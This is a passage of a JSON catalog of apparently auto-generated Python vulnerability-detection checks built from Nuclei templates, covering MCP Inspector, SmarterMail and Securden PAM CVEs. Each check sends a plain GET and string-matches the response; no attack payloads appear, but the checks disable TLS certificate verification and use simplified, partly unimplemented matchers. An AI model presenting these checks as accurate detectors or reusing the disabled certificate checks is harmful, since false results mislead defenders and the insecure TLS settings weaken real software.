path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(body,\"MCP Inspector\") / [OR] DSL: status_code == 200; compare_versions(version, \\'< 0.14.0\\') / [OR] DSL: contains_all(body,\"endpoint\",\"/message?sessionId=\"); status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['< 0.14.0']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"MCP Inspector < 0.14.0 UnauthenticatedRemote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_49596(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-49596\nName: MCP Inspector < 0.14.0 UnauthenticatedRemote Code Execution\nSeverity: critical\nDescription: The MCP inspector is a developer tool for testing and debugging MCP servers. Versions of MCP Inspector below 0.14.1 are vulnerable to remote code execution due to lack of authentication between the Inspector client and proxy, allowing unauthenticated requests to launch MCP commands over stdio.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_49596:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-49596\"\n    SEVERITY = \"critical\"\n    NAME = \"MCP Inspector < 0.14.0 UnauthenticatedRemote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(body,\"MCP Inspector\") / [OR] DSL: status_code == 200; compare_versions(version, \\'< 0.14.0\\') / [OR] DSL: contains_all(body,\"endpoint\",\"/message?sessionId=\"); status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['< 0.14.0']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"MCP Inspector < 0.14.0 UnauthenticatedRemote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_49596(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [
          "CVE-2025-49596"
        ],
        "tags": [
          "cve",
          "cve2025",
          "mcp",
          "anthropic",
          "unauth",
          "passive",
          "vkev",
          "vuln",
          "ai"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_52691",
        "name": "SmarterMail - Unrestricted File Upload",
        "language": "Python",
        "famille": "CVE",
        "description": "Mail server contains an unrestricted file upload vulnerability allowing unauthenticated attackers to upload arbitrary files to any location, potentially enabling remote code execution.",
        "severity": "critical",
        "detection": "[AND] mot(s) '\"fileName\":, {\"key\":' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: rand_string",
            "default": "{{to_lower(rand_text_alpha(6))}}"
          },
          {
            "name": "file_name",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: file_name",
            "default": "{{to_lower(rand_text_alpha(6))}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-52691\nName: SmarterMail - Unrestricted File Upload\nSeverity: critical\nDescription: Mail server contains an unrestricted file upload vulnerability allowing unauthenticated attackers to upload arbitrary files to any location, potentially enabling remote code execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_52691:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-52691\"\n    SEVERITY = \"critical\"\n    NAME = \"SmarterMail - Unrestricted File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"fileName\":, {\"key\":\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"fileName\":, {\"key\":']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"SmarterMail - Unrestricted File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_52691(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-52691\nName: SmarterMail - Unrestricted File Upload\nSeverity: critical\nDescription: Mail server contains an unrestricted file upload vulnerability allowing unauthenticated attackers to upload arbitrary files to any location, potentially enabling remote code execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_52691:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-52691\"\n    SEVERITY = \"critical\"\n    NAME = \"SmarterMail - Unrestricted File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"fileName\":, {\"key\":\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"fileName\":, {\"key\":']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"SmarterMail - Unrestricted File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_52691(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "smartermail",
          "file-upload",
          "intrusive",
          "rce",
          "kev",
          "vkev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_53118",
        "name": "Securden Unified PAM - Authentication Bypass",
        "language": "Python",
        "famille": "CVE",
        "description": "An authentication bypass vulnerability exists which allows an unauthenticated attacker to control administrator backup functions, leading to compromise of passwords, secrets, and application session tokens stored by the Unified PAM.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 302 / [OR] DSL: status_code == 200; contains(body, 'token') / [OR] DSL: status_code == 200; contains(body, 'current_date')",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-53118\nName: Securden Unified PAM - Authentication Bypass\nSeverity: critical\nDescription: An authentication bypass vulnerability exists which allows an unauthenticated attacker to control administrator backup functions, leading to compromise of passwords, secrets, and application session tokens stored by the Unified PAM.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_53118:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-53118\"\n    SEVERITY = \"critical\"\n    NAME = \"Securden Unified PAM - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: status_code == 302 / [OR] DSL: status_code == 200; contains(body, 'token') / [OR] DSL: status_code == 200; contains(body, 'current_date')\"\n\n        # Simple word matcher simulation\n        matchers = ['token', 'current_date']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Securden Unified PAM - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_53118(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-53118\nName: Securden Unified PAM - Authentication Bypass\nSeverity: critical\nDescription: An authentication bypass vulnerability exists which allows an unauthenticated attacker to control administrator backup functions, leading to compromise of passwords, secrets, and application session tokens stored by the Unified PAM.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_53118:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-53118\"\n    SEVERITY = \"critical\"\n    NAME = \"Securden Unified PAM - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return 